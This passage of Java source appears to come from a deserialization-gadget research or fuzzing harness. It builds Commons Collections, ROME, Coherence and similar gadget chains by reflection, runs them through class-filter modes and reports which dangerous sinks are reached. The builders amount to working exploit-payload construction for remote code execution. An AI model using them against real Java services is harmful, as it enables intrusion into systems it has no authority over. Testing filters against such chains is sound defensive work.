                        addMethod.invoke(bag, sink2);
                    }

                    // 3. Swap the internal TreeMap's comparator to the real (dangerous) one
                    //    TreeBag.writeObject() serializes this comparator via comparator() method
                    //    which reads from the internal TreeMap
                    Field mapField = findField(treeBagClass, "map");
                    if (mapField == null) mapField = findField(treeBagClass.getSuperclass(), "map");
                    if (mapField != null) {
                        mapField.setAccessible(true);
                        Object internalMap = mapField.get(bag);
                        if (internalMap instanceof TreeMap) {
                            Field compField = TreeMap.class.getDeclaredField("comparator");
                            compField.setAccessible(true);
                            compField.set(internalMap, realComp);
                        }
                    }
                    return bag;
                }

                return createInstance(treeBagClass);
            } catch (ClassNotFoundException e) {
                continue;
            }
        }
        return buildTreeSet(chain, ir);
    }

    private static Object buildBadAttrValExp(Object[] chain, JsonObject ir) throws Exception {
        // BadAttributeValueExpException.readObject → val.toString()
        // ROME1/Vaadin1 entry point
        javax.management.BadAttributeValueExpException bave =
            new javax.management.BadAttributeValueExpException(null);
        if (chain.length > 0) {
            Field valField = javax.management.BadAttributeValueExpException.class.getDeclaredField("val");
            valField.setAccessible(true);
            valField.set(bave, chain[0]);
        }
        return bave;
    }

    private static Object buildBidiMap(String rootClass, Object[] chain, JsonObject ir) throws Exception {
        // DualHashBidiMap/DualTreeBidiMap: readObject → HashMap.put → hash → key.hashCode
        // AbstractDualBidiMap internally uses normalMap (a HashMap) and reverseMap
        Class<?> clazz = Class.forName(rootClass);
        Object bidiMap = createInstance(clazz);

        if (chain.length > 0) {
            Object sink = findSinkObject(chain);
            Comparator<?> comp = (chain[0] instanceof Comparator) ? (Comparator<?>) chain[0] : null;

            // DualTreeBidiMap uses TreeMap internally; DualHashBidiMap uses HashMap
            boolean isTree = rootClass.contains("Tree");

            Field normalMapField = findField(clazz, "normalMap");
            if (normalMapField != null) {
                normalMapField.setAccessible(true);
                if (isTree && comp != null) {
                    @SuppressWarnings("unchecked")
                    TreeMap<Object, Object> tm = new TreeMap<>((Comparator<Object>) comp);
                    normalMapField.set(bidiMap, tm);
                    injectTreeMapEntries(tm, sink);
                } else {
                    HashMap<Object, Object> hm = new HashMap<>();
                    normalMapField.set(bidiMap, hm);
                    forceMapPut(hm, chain[0], "val");
                }
                // Set reverseMap to avoid NPE
                Field reverseMapField = findField(clazz, "reverseMap");
                if (reverseMapField != null) {
                    reverseMapField.setAccessible(true);
                    if (reverseMapField.get(bidiMap) == null) {
                        reverseMapField.set(bidiMap, isTree ? new TreeMap<>() : new HashMap<>());
                    }
                }
            } else {
                // Fallback: try maps[] array (older CC versions)
                Field mapsField = findField(clazz, "maps");
                if (mapsField != null) {
                    mapsField.setAccessible(true);
                    if (isTree && comp != null) {
                        @SuppressWarnings("unchecked")
                        TreeMap<Object, Object> tm = new TreeMap<>((Comparator<Object>) comp);
                        injectTreeMapEntries(tm, sink);
                        Map<?, ?>[] maps = new Map[]{tm, new TreeMap<>()};
                        mapsField.set(bidiMap, maps);
                    } else {
                        HashMap<Object, Object> hm = new HashMap<>();
                        forceMapPut(hm, chain[0], "val");
                        Map<?, ?>[] maps = new Map[]{hm, new HashMap<>()};
                        mapsField.set(bidiMap, maps);
                    }
                }
            }

            // Set comparator field if present (DualTreeBidiMap has 'comparator')
            if (comp != null) {
                Field compField = findField(clazz, "comparator");
                if (compField != null) {
                    compField.setAccessible(true);
                    compField.set(bidiMap, comp);
                }
            }
        }
        return bidiMap;
    }

    // ── Reflection utilities ────────────────────────────────────

    @SuppressWarnings("deprecation")
    private static Object createInstance(Class<?> clazz) throws Exception {
        // Try no-arg constructor first
        try {
            Constructor<?> ctor = clazz.getDeclaredConstructor();
            ctor.setAccessible(true);
            return ctor.newInstance();
        } catch (NoSuchMethodException e) {
            // Fall back to sun.misc.Unsafe for classes without no-arg constructor
            Field unsafeField = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);
            return unsafe.allocateInstance(clazz);
        }
    }

    private static void setField(Object obj, Class<?> clazz, String fieldName, Object value) throws Exception {
        Field f = findField(clazz, fieldName);
        if (f != null) {
            f.setAccessible(true);
            value = coerceValue(f.getType(), value);
            f.set(obj, value);
        }
    }

    /** Coerce value to match expected field type (e.g. String[] -> Class[]). */
    private static Object coerceValue(Class<?> fieldType, Object value) {
        if (value == null) return null;
        // String[] -> Class[] conversion for iParamTypes
        if (fieldType.equals(Class[].class) && value instanceof String[]) {
            String[] strs = (String[]) value;
            Class<?>[] classes = new Class<?>[strs.length];
            for (int i = 0; i < strs.length; i++) {
                try { classes[i] = Class.forName(strs[i]); }
                catch (ClassNotFoundException e) { classes[i] = Object.class; }
            }
            return classes;
        }
        // Object[] -> Class[] (resolveValue may return Object[])
        if (fieldType.equals(Class[].class) && value instanceof Object[]) {
            Object[] objs = (Object[]) value;
            Class<?>[] classes = new Class<?>[objs.length];
            for (int i = 0; i < objs.length; i++) {
                if (objs[i] instanceof Class) classes[i] = (Class<?>) objs[i];
                else if (objs[i] instanceof String) {
                    try { classes[i] = Class.forName((String) objs[i]); }
                    catch (ClassNotFoundException e) { classes[i] = Object.class; }
                } else classes[i] = Object.class;
            }
            return classes;
        }
        // String[] -> Object[] (each string becomes an element, not nested)
        if (fieldType.equals(Object[].class) && value instanceof String[]) {
            String[] strs = (String[]) value;
            Object[] result = new Object[strs.length];
            System.arraycopy(strs, 0, result, 0, strs.length);
            return result;
        }
        // Object[] -> typed array (e.g. Transformer[], Comparator[])
        if (fieldType.isArray() && value instanceof Object[]) {
            Class<?> componentType = fieldType.getComponentType();
            Object[] src = (Object[]) value;
            Object typedArray = java.lang.reflect.Array.newInstance(componentType, src.length);
            for (int i = 0; i < src.length; i++) {
                java.lang.reflect.Array.set(typedArray, i, src[i]);
            }
            return typedArray;
        }
        return value;
    }

    private static Field findField(Class<?> clazz, String name) {
        while (clazz != null) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }

    /**
     * General pattern for comparator-based root triggers:
     *   1. Create container with dummy comparator (safe, no chain trigger)
     *   2. Add sink objects via public API
     *   3. Swap comparator to real gadget
     *   4. On readObject: container rebuilds with real comparator → compare(sink,sink) → RCE
     *
     * Works for: PriorityQueue, TreeMap, TreeSet, TreeBag, DualTreeBidiMap
     */
    private static void swapComparator(Object container, Comparator<?> realComp) throws Exception {
        // Find the internal TreeMap/comparator field and swap
        if (container instanceof PriorityQueue) {
            Field f = PriorityQueue.class.getDeclaredField("comparator");
            f.setAccessible(true);
            f.set(container, realComp);
        } else if (container instanceof TreeMap) {
            Field f = TreeMap.class.getDeclaredField("comparator");
            f.setAccessible(true);
            f.set(container, realComp);
        } else if (container instanceof TreeSet) {
            Field mField = TreeSet.class.getDeclaredField("m");
            mField.setAccessible(true);
            Object backing = mField.get(container);
            if (backing instanceof TreeMap) {
                Field f = TreeMap.class.getDeclaredField("comparator");
                f.setAccessible(true);
                f.set(backing, realComp);
            }
        } else {
            // Generic: look for 'map' field → TreeMap inside
            Field mapField = findField(container.getClass(), "map");
            if (mapField == null && container.getClass().getSuperclass() != null) {
                mapField = findField(container.getClass().getSuperclass(), "map");
            }
            if (mapField != null) {
                mapField.setAccessible(true);
                Object map = mapField.get(container);
                if (map instanceof TreeMap) {
                    Field f = TreeMap.class.getDeclaredField("comparator");
                    f.setAccessible(true);
                    f.set(map, realComp);
                }
            }
        }
    }

    /**
     * Find the best sink object in the chain (TemplatesImpl > JdbcRowSetImpl > last link).
     * This is the object that comparator.compare() should operate on.
     */
    private static Object findSinkObject(Object[] chain) {
        // Search from end: prefer TemplatesImpl, then JdbcRowSetImpl
        for (int i = chain.length - 1; i >= 0; i--) {
            String cn = chain[i].getClass().getName();
            if (cn.contains("TemplatesImpl")) return chain[i];
        }
        for (int i = chain.length - 1; i >= 0; i--) {
            String cn = chain[i].getClass().getName();
            if (cn.contains("JdbcRowSetImpl")) return chain[i];
        }
        // Fallback: last non-Comparator link
        for (int i = chain.length - 1; i >= 0; i--) {
            if (!(chain[i] instanceof Comparator)) return chain[i];
        }
        return chain.length > 0 ? chain[chain.length - 1] : "dummy";
    }

    /**
     * Inject 2 entries into a TreeMap via reflection, bypassing comparator.compare() during insertion.
     * This is needed because compare() would trigger the gadget chain during construction.
     * During readObject(), TreeMap re-inserts entries and triggers compare() properly.
     */
    private static void injectTreeMapEntries(TreeMap<Object, Object> tm, Object sink) throws Exception {
        // Strategy: temporarily set comparator to null, insert entries, restore comparator
        Field compField = TreeMap.class.getDeclaredField("comparator");
        compField.setAccessible(true);
        Object realComp = compField.get(tm);

        // Set null comparator → natural ordering → use dummy keys for insertion
        compField.set(tm, null);
        tm.clear();
        // Insert with dummy String keys (natural ordering works for Strings)
        tm.put("aaaa", "val1");
        tm.put("bbbb", "val2");

        // Now swap the keys to sink objects via reflection on TreeMap.Entry nodes
        Field rootField = TreeMap.class.getDeclaredField("root");
        rootField.setAccessible(true);
        Object root = rootField.get(tm);
        if (root != null) {
            // TreeMap$Entry has 'key' field
            Field keyField = root.getClass().getDeclaredField("key");
            keyField.setAccessible(true);
            // Replace root key with sink
            keyField.set(root, sink);
            // Find child entries and replace their keys too
            Field leftField = root.getClass().getDeclaredField("left");
            Field rightField = root.getClass().getDeclaredField("right");
            leftField.setAccessible(true);
            rightField.setAccessible(true);
            Object left = leftField.get(root);
            Object right = rightField.get(root);
            if (left != null) {
                // Create a clone of sink for 2nd entry (different ref, same fields)
                Object sink2 = cloneShallow(sink);
                keyField.set(left, sink2 != null ? sink2 : sink);
            }
            if (right != null) {
                Object sink2 = cloneShallow(sink);
                keyField.set(right, sink2 != null ? sink2 : sink);
            }
        }

        // Restore real comparator — will be used during readObject().heapify()
        compField.set(tm, realComp);
    }

    /** Shallow-clone an object by copying all declared fields. */
    private static Object cloneShallow(Object src) {
        try {
            Object copy = createInstance(src.getClass());
            Class<?> cls = src.getClass();
            while (cls != null && cls != Object.class) {
                for (Field f : cls.getDeclaredFields()) {
                    if (java.lang.reflect.Modifier.isStatic(f.getModifiers())) continue;
                    f.setAccessible(true);
                    f.set(copy, f.get(src));
                }
                cls = cls.getSuperclass();
            }
            return copy;
        } catch (Exception e) {
            return null;
        }
    }

    private static void forceMapPut(Map<Object, Object> map, Object key, Object value) throws Exception {
        // Put via reflection to avoid triggering hashCode/compare during setup
        if (map instanceof HashMap) {
            // Directly manipulate internal table
            // Simple approach: just use put, as the gadget object's hashCode
            // shouldn't trigger the chain during construction (chain not yet wired)
            map.put(key, value);
        } else {
            map.put(key, value);
        }
    }

    private static Object resolveValue(JsonElement elem, Object[] chain) throws Exception {
        if (elem.isJsonObject()) {
            JsonObject obj = elem.getAsJsonObject();
            // Reference to another chain link
            if (obj.has("$ref")) {
                String ref = obj.get("$ref").getAsString();
                if (ref.startsWith("link:")) {
                    int idx = Integer.parseInt(ref.substring(5));
                    if (idx >= 0 && idx < chain.length) return chain[idx];
                }
                return null;
            }
            // Inline object construction
            if (obj.has("class")) {
                return compileLink(obj, chain, -1);
            }
            // Literal map
            Map<String, Object> map = new LinkedHashMap<>();
            for (Map.Entry<String, JsonElement> e : obj.entrySet()) {
                map.put(e.getKey(), resolveValue(e.getValue(), chain));
            }
            return map;
        } else if (elem.isJsonArray()) {
            JsonArray arr = elem.getAsJsonArray();
            Object[] result = new Object[arr.size()];
            for (int i = 0; i < arr.size(); i++) {
                result[i] = resolveValue(arr.get(i), chain);
            }
            // Convert to String[] only if ALL elements are Strings
            if (result.length > 0) {
                boolean allStrings = true;
                for (Object r : result) {
                    if (!(r instanceof String)) { allStrings = false; break; }
                }
                if (allStrings) {
                    String[] strArr = new String[result.length];
                    for (int i = 0; i < result.length; i++) {
                        strArr[i] = (String) result[i];
                    }
                    return strArr;
                }
            }
            return result;
        } else {
            return resolveJsonPrimitive(elem);
        }
    }

    private static Object resolveJsonPrimitive(JsonElement elem) {
        if (elem.isJsonNull()) return null;
        JsonPrimitive p = elem.getAsJsonPrimitive();
        if (p.isBoolean()) return p.getAsBoolean();
        if (p.isNumber()) {
            // Prefer int if whole number
            double d = p.getAsDouble();
            if (d == Math.floor(d) && d >= Integer.MIN_VALUE && d <= Integer.MAX_VALUE) {
                return (int) d;
            }
            return d;
        }
        // Return all strings as-is; coerceValue handles String→Class conversion
        return p.getAsString();
    }

    // ── Deserialization with tracking ───────────────────────────

    private static DeserResult deserialize(byte[] data) {
        DeserResult result = new DeserResult();
        TrackingObjectInputStream ois = null;

        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(data);
            ois = new TrackingObjectInputStream(bais, result);

            Object deserialized = ois.readObject();
            result.success = true;

        } catch (Exception e) {
            result.success = false;
            result.exception = e.getMessage();
            result.exceptionClass = e.getClass().getName();

            // Check if filter rejected
            if (e instanceof InvalidClassException) {
                result.filterDecision = "REJECTED";
                String msg = e.getMessage();
                if (msg != null && msg.contains("filter status: REJECTED")) {
                    // Extract rejected class from message
                    int idx = msg.indexOf(';');
                    if (idx > 0) {
                        result.filterRejectedClass = msg.substring(0, idx);
                    }
                }
            } else if (e.getCause() instanceof InvalidClassException) {
                result.filterDecision = "REJECTED";
            }
        } finally {
            // Always capture resolved classes (even on failure — partial chain info)
            if (ois != null) {
                result.resolvedClasses = ois.getResolvedClasses();
            }
        }

        if (result.filterDecision == null) {
            result.filterDecision = result.success ? "ALLOWED" : "N/A";
        }

        return result;
    }

    // ── Custom ObjectInputStream with class tracking + filtering ─

    static class TrackingObjectInputStream extends ObjectInputStream {
        private final List<String> resolvedClasses = new ArrayList<>();
        private final DeserResult result;
        private final Set<String> denySet;
        private final boolean checkPackages;
        private int depth = 0;

        TrackingObjectInputStream(InputStream in, DeserResult result) throws IOException {
            super(in);
            this.result = result;

            // Build deny set based on filter mode (resolveClass-based for JDK8 compat)
            if ("jep290".equals(filterMode)) {
                this.denySet = new HashSet<>(JEP290_DENY);
                this.checkPackages = false;
            } else if ("denylist".equals(filterMode)) {
                this.denySet = new HashSet<>(JEP290_DENY);
                this.denySet.addAll(DENYLIST_EXTRA);
                this.checkPackages = false;
            } else if ("weblogic".equals(filterMode)) {
                this.denySet = new HashSet<>(WL_BLACKLIST_CLASSES);
                this.checkPackages = true;
            } else if ("wildfly".equals(filterMode)) {
                this.denySet = new HashSet<>(WF_JPMS_DENY);
                this.checkPackages = true;
            } else {
                this.denySet = Collections.emptySet();
                this.checkPackages = false;
            }
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc)
                throws IOException, ClassNotFoundException {
            String name = desc.getName();
            resolvedClasses.add(name);
            depth++;

            // Filter check in resolveClass (works on JDK 8+)
            if (!denySet.isEmpty()) {
                // Class-level check
                if (denySet.contains(name)) {
                    result.filterDecision = "REJECTED";
                    result.filterRejectedClass = name;
                    throw new ClassNotFoundException("Filtered: " + name);
                }
                // Package-level check (weblogic mode)
                if (checkPackages) {
                    String pkg = name.contains(".") ? name.substring(0, name.lastIndexOf('.')) : "";
                    if (WL_BLACKLIST_PACKAGES.contains(pkg) || WF_JPMS_DENY_PACKAGES.contains(pkg)) {
                        result.filterDecision = "REJECTED";
                        result.filterRejectedClass = name;
                        throw new ClassNotFoundException("Filtered (pkg): " + name);
                    }
                }
            }

            return super.resolveClass(desc);
        }

        List<String> getResolvedClasses() {
            return Collections.unmodifiableList(resolvedClasses);
        }
    }

    // ── Sink data from agent ────────────────────────────────────

    private static void resetAgentTracking() {
        try {
            Class<?> agentClass = Class.forName("DeserAgent");
            Method reset = agentClass.getMethod("resetTracking");
            reset.invoke(null);
        } catch (Exception | NoClassDefFoundError e) {
            // Agent not loaded — sink tracking disabled
        }
    }

    private static void populateSinkData(JsonObject output) {
        try {
            Class<?> agentClass = Class.forName("DeserAgent");

            @SuppressWarnings("unchecked")
            Set<String> sinks = (Set<String>) agentClass.getMethod("getSinksHit").invoke(null);

            @SuppressWarnings("unchecked")
            List<String> log = (List<String>) agentClass.getMethod("getInvocationLog").invoke(null);

            // Pick highest-priority sink as primary (critical > high > other)
            String primarySink = null;
            String[] priority = {"cmd_exec", "jndi_lookup", "script_exec",
                                 "file_write", "network", "class_load",
                                 "thread_spawn", "reflection"};
            for (String p : priority) {
                if (sinks.contains(p)) { primarySink = p; break; }
            }
            if (primarySink == null && !sinks.isEmpty()) {
                primarySink = sinks.iterator().next();
            }
            output.addProperty("sink_reached", primarySink);

            // Full set of all sinks hit (for oracle to check all)
            JsonArray sinksArr = new JsonArray();
            for (String s : sinks) { sinksArr.add(s); }
            output.add("sinks_hit", sinksArr);

            // Danger indicator booleans
            output.addProperty("process_spawned", sinks.contains("cmd_exec"));
            output.addProperty("jndi_lookup", sinks.contains("jndi_lookup"));
            output.addProperty("class_loaded", sinks.contains("class_load"));
            output.addProperty("file_accessed", sinks.contains("file_write"));
            output.addProperty("network_connected", sinks.contains("network"));
            output.addProperty("script_executed", sinks.contains("script_exec"));
            output.addProperty("thread_spawned", sinks.contains("thread_spawn"));

            // Method invocation log
            JsonArray invocations = new JsonArray();
            for (String entry : log) {
                invocations.add(entry);
            }
            output.add("method_invocations", invocations);
            output.addProperty("method_invocation_hash", hashList(log));

        } catch (ClassNotFoundException | NoClassDefFoundError e) {
            // Agent not loaded — no sink data
            output.addProperty("sink_reached", (String) null);
            output.addProperty("process_spawned", false);
            output.addProperty("jndi_lookup", false);
            output.addProperty("class_loaded", false);
            output.addProperty("file_accessed", false);
            output.addProperty("network_connected", false);
            output.addProperty("script_executed", false);
            output.addProperty("thread_spawned", false);
        } catch (Exception e) {
            output.addProperty("sink_reached", (String) null);
        }
    }

    private static int computeSinkDepth(DeserResult result, JsonObject output) {
        if (!output.has("sink_reached") || output.get("sink_reached").isJsonNull()) {
            return 0;
        }
        // Depth = number of classes resolved before first sink
        return result.resolvedClasses.size();
    }

    // ── Type hierarchy builder ──────────────────────────────────

    private static void buildTypeHierarchy() {
        // Key gadget interfaces and their known implementations
        addHierarchy("java.util.Comparator", Arrays.asList(
            "org.apache.commons.collections4.comparators.TransformingComparator",
            "org.apache.commons.beanutils.BeanComparator",
            "org.apache.click.control.Column$ColumnComparator",
            "java.text.RuleBasedCollator",
            "java.lang.String$CaseInsensitiveComparator"
        ));

        addHierarchy("org.apache.commons.collections.Transformer", Arrays.asList(
            "org.apache.commons.collections.functors.InvokerTransformer",
            "org.apache.commons.collections.functors.ChainedTransformer",
            "org.apache.commons.collections.functors.ConstantTransformer",
            "org.apache.commons.collections.functors.InstantiateTransformer",
            "org.apache.commons.collections.functors.MapTransformer"
        ));

        addHierarchy("org.apache.commons.collections4.Transformer", Arrays.asList(
            "org.apache.commons.collections4.functors.InvokerTransformer",
            "org.apache.commons.collections4.functors.ChainedTransformer",
            "org.apache.commons.collections4.functors.ConstantTransformer",
            "org.apache.commons.collections4.functors.InstantiateTransformer"
        ));

        addHierarchy("java.lang.reflect.InvocationHandler", Arrays.asList(
            "sun.reflect.annotation.AnnotationInvocationHandler",
            "java.beans.EventHandler",
            "bsh.XThis$Handler"
        ));

        addHierarchy("java.util.Map", Arrays.asList(
            "java.util.HashMap",
            "java.util.Hashtable",
            "java.util.TreeMap",
            "java.util.LinkedHashMap",
            "java.util.concurrent.ConcurrentHashMap",
            "org.apache.commons.collections.map.LazyMap",
            "org.apache.commons.collections.map.TransformedMap",
            "org.apache.commons.collections4.map.LazyMap"
        ));

        // ROME gadget classes
        addHierarchy("com.sun.syndication.feed.impl", Arrays.asList(
            "com.sun.syndication.feed.impl.ToStringBean",
            "com.sun.syndication.feed.impl.ObjectBean",
            "com.sun.syndication.feed.impl.EqualsBean"
        ));

        // Groovy closures
        addHierarchy("groovy.lang.Closure", Arrays.asList(
            "org.codehaus.groovy.runtime.MethodClosure",
            "org.codehaus.groovy.runtime.ConvertedClosure"
        ));

        addHierarchy("groovy.lang.GString", Arrays.asList(
            "org.codehaus.groovy.runtime.GStringImpl"
        ));

        // Hibernate getter chain
        addHierarchy("org.hibernate.type.Type", Arrays.asList(
            "org.hibernate.type.ComponentType"
        ));

        // Vaadin property chain
        addHierarchy("com.vaadin.data.Property", Arrays.asList(
            "com.vaadin.data.util.MethodProperty",
            "com.vaadin.data.util.NestedMethodProperty"
        ));

        // JNDI sink objects (no TemplatesImpl needed, JDK 17+ compatible)
        addHierarchy("javax.sql.rowset.BaseRowSet", Arrays.asList(
            "com.sun.rowset.JdbcRowSetImpl"
        ));

        // TemplatesImpl (bytecode loading sink)
        addHierarchy("javax.xml.transform.Templates", Arrays.asList(
            "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
        ));

        // ── Coherence gadget classes (CVE-2020-2555, CVE-2020-2883, CVE-2021-2394) ──
        // ValueExtractor hierarchy — analog of CC's Transformer
        addHierarchy("com.tangosol.util.ValueExtractor", Arrays.asList(
            "com.tangosol.util.extractor.ReflectionExtractor",
            "com.tangosol.util.extractor.ChainedExtractor",
            "com.tangosol.util.extractor.MultiExtractor",
            "com.tangosol.util.extractor.UniversalExtractor",
            "com.tangosol.util.extractor.AbstractExtractor",
            "com.tangosol.util.extractor.ComparisonValueExtractor",
            "com.tangosol.util.extractor.ScriptValueExtractor"
        ));
        // ExtractorComparator — bridge from compare() to extract()
        addHierarchy("com.tangosol.util.comparator.ExtractorComparator", Arrays.asList(
            "com.tangosol.util.comparator.ExtractorComparator"
        ));
        // LimitFilter — toString() trigger for CVE-2020-2555
        addHierarchy("com.tangosol.util.filter.LimitFilter", Arrays.asList(
            "com.tangosol.util.filter.LimitFilter"
        ));

        // Validate which classes are actually on classpath
        for (Map.Entry<String, List<String>> entry : TYPE_HIERARCHY.entrySet()) {
            List<String> valid = new ArrayList<>();
            for (String cls : entry.getValue()) {
                try {
                    Class<?> c = Class.forName(cls);
                    if (Serializable.class.isAssignableFrom(c)) {
                        valid.add(cls);
                        SERIALIZABLE_CLASSES.add(cls);
                    }
                } catch (ClassNotFoundException | NoClassDefFoundError e) {
                    // Not on classpath or missing dependency — skip
                }
            }
            entry.setValue(valid);
        }
    }

    private static void addHierarchy(String iface, List<String> impls) {
        TYPE_HIERARCHY.put(iface, new ArrayList<>(impls));
    }

    // Export type hierarchy for Python-side mutator
    static String exportTypeHierarchy() {
        JsonObject obj = new JsonObject();
        for (Map.Entry<String, List<String>> entry : TYPE_HIERARCHY.entrySet()) {
            JsonArray arr = new JsonArray();
            for (String cls : entry.getValue()) arr.add(cls);
            obj.add(entry.getKey(), arr);
        }
        JsonArray ser = new JsonArray();
        for (String cls : SERIALIZABLE_CLASSES) ser.add(cls);
        obj.add("_serializable", ser);
        return obj.toString();
    }

    // ── Utilities ───────────────────────────────────────────────

    private static String hashList(List<String> items) {
        if (items == null || items.isEmpty()) return "empty";
        return Integer.toHexString(items.hashCode());
    }

    private static String errorJson(String type, String message) {
        JsonObject obj = new JsonObject();
        obj.addProperty("compiled", false);
        obj.addProperty("error_type", type);
        obj.addProperty("error", message);
        obj.addProperty("deserialized", false);
        obj.addProperty("sink_reached", (String) null);
        obj.addProperty("process_spawned", false);
        obj.addProperty("jndi_lookup", false);
        obj.addProperty("class_loaded", false);
        obj.addProperty("file_accessed", false);
        obj.addProperty("network_connected", false);
        return obj.toString();
    }

    // ── Result container ────────────────────────────────────────

    static class DeserResult {
        boolean success = false;
        String exception = null;
        String exceptionClass = null;
        String filterDecision = null;
        String filterRejectedClass = null;
        List<String> resolvedClasses = new ArrayList<>();
    }
}
